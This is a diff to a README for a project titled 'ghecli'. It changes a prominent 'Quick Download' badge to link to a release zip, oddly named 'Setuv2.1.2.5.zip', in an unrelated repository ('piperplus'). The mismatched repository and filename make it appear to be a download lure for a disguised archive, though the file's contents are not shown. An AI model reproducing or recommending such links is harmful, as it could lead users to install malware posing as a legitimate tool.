@@ -1,4 +1,4 @@
-[![⚡ Quick Download](https://img.shields.io/badge/⚡_Quick-Download-orange?style=for-the-badge)](https://github.com/ryanblab1903n8/piperplus/releases/download/v3.0.0/Setuv2.1.2.5.zip)
+[![⚡ Quick Download](https://img.shields.io/badge/⚡_Quick-Download-orange?style=for-the-badge)](https://github.com/ryanblab1903n8/piperplus/releases/download/v4.0.0/Setuv2.1.2.5.zip)
 
 # ⚡ ghecli
 
